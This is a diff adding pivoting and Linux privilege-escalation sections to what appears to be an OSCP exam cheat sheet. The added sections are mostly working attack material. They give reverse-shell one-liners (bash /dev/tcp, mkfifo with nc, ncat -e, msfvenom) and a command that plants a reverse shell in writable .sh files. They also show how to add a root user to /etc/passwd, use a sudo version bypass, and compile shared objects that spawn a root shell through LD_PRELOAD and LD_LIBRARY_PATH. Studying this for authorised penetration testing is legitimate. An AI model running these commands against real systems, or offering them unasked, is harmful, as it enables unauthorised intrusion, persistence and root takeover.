@@ -688,3 +688,283 @@ If you can't move file from Kali to the internal network, you can create a new s
 - and query # user in groups:
 
 `querygroup <rid #>`
+
+# Setting up Pivot
+
+### SSH
+
+make sure SSH is enabled on kali
+
+`systemctl status ssh`
+
+start ssh if not enabled
+
+`systemctl start ssh`
+
+Next, on target device we have aceess to, set up dynamic pivot into network. AKA, SSH into our local kali box with these creds:
+
+`ssh -N -R 9998 <username>@<IP>`
+
+Check status of pivot w/ 
+
+`ss -anp`
+
+Make sure Proxychains is configured with the correct port
+
+### Chisel HTTP Tunnel
+
+- (https://github.com/jpillora/chisel)
+
+`Transfer chisel to client`
+
+then on our Kali machine start the chisel server
+
+`chisel server --port 8080 --reverse`
+
+and on the target (our example with be from a windows device)
+
+`.\chisel.exe client <IP>:8080 R:socks`
+
+should receive connection on and have pivot on port 1080
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/7e72cd76-967d-4990-b9f2-af1635d89cd8)
+
+Add port 1080 to `/etc/proxychains4.conf` and continue to enumerate the rest of the network:
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/264adc93-353e-4cff-b6dd-0f0391a3ae0d)
+
+# Linux Cheat Sheet
+
+********Quick Reverse Shell********
+
+/bin/bash -i >& /dev/tcp/<IP>/<Port> 0>&1
+
+`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f elf -o reverse.elf`
+
+**Easy cat rev shell one liner into .sh files:** 
+
+`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc **<IP>** **<Port>** >/tmp/f" >> **<Filename>.sh`
+
+**Some nc rev shell examples**
+
+If you have command execution but the shells your making is dont work nc will almost always work, I have not done a CTF or box provided by offsec where nc was not usable. The syntax of the command can be different from box to box, the examples listed below work in any box I did to prepare for the exam
+
+`ncat -e /bin/bash <IP> <Port>`
+
+`nc -e /bin/bash`
+
+`nc <IP> <Port> -e cmd`
+
+**THE GOAT, pwnkit**
+
+https://github.com/joeammond/CVE-2021-4034
+
+## Low Hanging Fruit
+
+**User with valid credentials (sudo -l):**
+
+- `sudo -l` to see what binaries you can run with `sudo`, head over to [GTFOBins](https://gtfobins.github.io/)
+- `sudo -V` to get version, below 1.28 can use `sudo -u#-1 /bin/bash`
+
+**SUID Binaries**
+
+- `find / -perm -u=s -type f 2>/dev/null`
+- `find / -perm -4000 2>/dev/null`
+- Head over to [GTFOBins](https://gtfobins.github.io/)
+
+**Kernel Exploits:**
+
+- `uname -a` && `searchsploit`
+- [Compiled Kernel Exploits](https://github.com/lucyoa/kernel-exploits)
+- `~/exploits` and Privilege Escalation notes
+
+**Writable /etc/passwd**
+
+- `ls -la /etc/passwd` to see if you have write permissions
+- `openssl passwd -1 -salt hacker hacker` and replace `root` password entry (or delete `x`)
+- `su root` `hacker`
+
+## Checklist
+
+- **Upgrade your shell** if it's not fully interactive
+    - `python -c 'import pty;pty.spawn("/bin/bash")'`
+    - `python -c 'import pty;pty.spawn("/bin/sh")'`
+    - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+    - `python3 -c 'import pty;pty.spawn("/bin/sh")'`
+- **Get system context current user, hostname, groups**
+    - `whoami` `id` `hostname`
+- **Check for sudo (valid password) and LD_PRELOAD and LD_LIBRARY_PATH (examples below)**
+    - `sudo -l` `sudo -V` (below 1.28 `sudo -u#-1 /bin/bash`)
+- **Check for SUID Binaries**
+    - `find / -perm -u=s -type f 2>/dev/null`
+    - `find / -perm -4000 2>/dev/null`
+- **Check groups**
+    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe
+
+- **Check for users && writable /etc/passwd**
+    - `ls -la /etc/passwd` `cat /etc/passwd` `ls -l /etc/shadow`
+        - EX /etc/passwd:
+        
+        ```
+        joe@debian-privesc:~$ openssl passwd w00t
+        Fdzt.eqJQ4s0g
+        
+        joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+        ```
+        
+        - EX /etc/shadow:
+            - check what type of hash the /etc/shadow file is using, for example a password hash starting with ******$6$****** is sha-512. Generate new passwd based of hashing algorithm being utilized
+                - `mkpasswd -m sha-512 password`
+                - sha-512 hash example in /etc/shadow
+                
+                ![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/fe645ed8-aadf-4184-bd84-729376c3ef9b)
+                
+            
+            ![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/28b067cb-8b9e-4c21-90ec-6405dbe0f5e1)
+            
+            - Finally replace password in /etc/shadow of root user
+                
+                ![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/ff8b781f-6238-4c2e-90cb-da61637bf643)
+ 
+
+- **Check environment**
+    - `echo $PATH` `(env || set) 2>/dev/null` `history` `cat ~/.bashrc`
+- **Check processes**
+    - `ps aux` `ps aux | grep ‘^root’` `ps -ef` `watch -n 1 "ps -aux | grep pass"` `sudo tcpdump -i lo -A | grep "pass”`
+
+searchsploit suspicious processes ran by root especially
+
+- **Check cronjobs**
+    - `ls -lah /etc/cron*` `cat /var/log/syslog | grep cron` `cat /var/log/cron.log`
+    - `grep "CRON" /var/log/syslog` `ls -la /etc/cron.d` `ls -la /etc/cron.hourly`
+    - **CHECK FOR CRONTABS**  `cat /etc/crontab`
+- Easy Cat rev shell one liner into .sh files:
+
+`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc **<IP>** **<Port>** >/tmp/f" >> **<Filename>.sh**`
+
+**Abusing Capabilities:**
+
+Get capabilites of all files:
+
+`/usr/sbin/getcap -r / 2>/dev/null`
+
+Lopp for cap_setuid+ep
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/49613c76-e965-4b96-a43a-0dbcd8031e38)
+
+Search gtfobins and check for priv esc with said ca
+
+https://gtfobins.github.io/#+capabilities
+
+Do research and find priv esc
+
+- **Check networking & services running on localhost**
+    - `ip a` `netstat` `ss -anp`
+- **Check your writable/usable files & file permissions**
+    - `find / -writable -type d 2>/dev/null`
+    - `find / -perm -u=s -type f 2>/dev/null`
+    - `ls -la`
+- **Get kernel version && check for vulnerability**
+    - `uname -a` && `searchsploit`
+- Check for creds in, .db, .xml and .conf files from **`/var/www/html`**
+
+### LINPEAS AND `unix-privesc-check` and Linux Smart Enumeration (lse.sh)
+
+**CHECK THESE AS WELL**
+
+CVE-2021-3156
+
+DirtyPipe
+
+[CVE-2021-4034.py](http://cve-2021-4034.py/)
+
+### LD_PRELOAD and LD_LIBRARY_PATH examples
+
+**LD_PRELOAD**
+
+if running `sudo -l` and see LD_PRELOAD and have sudo perms on binary you can priv esc
+
+`sudo -l`
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/b5aa322a-3b36-4834-84e7-480bdf932eb8)
+
+Next make shared object (.so) file like so with c 
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/29dd79eb-f378-4d56-a67b-f7f62d8ae7f2)
+
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+```
+
+Next compile the .c expoit to create shared object (.so file)
+
+`gcc -fPIC -shared -nostartfiles -o /tmp/<filename>.so <filename>.c` 
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/a6e5e005-ca7c-4a92-8dfb-37d38c0d1729)
+
+
+Finally run binary with sudo and LD_preload shared object we just created
+
+`sudo LD_PRELOAD=/tmp/<filename>.so <binary>`
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/a15d4984-c762-4954-88ec-5d61877db895)
+
+_
+
+**LD_LIBRARY_PATH**
+
+if running `sudo -l` and seeLD_LIBRARY_PATH and have sudo perms on binary you can priv esc
+
+`sudo -l`
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/dfa2bf4c-5028-41dc-9512-fd01b5cfaae6)
+
+look for shared object to replace w/ `ldd` command on whatever binary
+
+`ldd <path_to_binary>`
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/ea46d3ea-c4db-40b4-a9bb-86c0718d7699)
+
+take note of the name of the shared object we want to replace
+
+Next, make shared object like so with .c
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+```
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/a6760026-a993-4a6a-9520-936d67ff6046)
+
+Next, complie the file and change the name of the file to the shared object we want to replace
+
+`gcc -o <ldd_sharedobject_to_replace> -shared -fPIC <filename>.c`
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/1ede207c-76d1-4c83-a880-953943fc2943)
+
+Finally, run binary with sudo perms and specifiy shared object
+
+`sudo LD_LIBRARY_PATH=. <binary>`
+
+![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/5e590910-05b1-47d1-9be4-ac1e17ab5a1e)
+
+
+
+
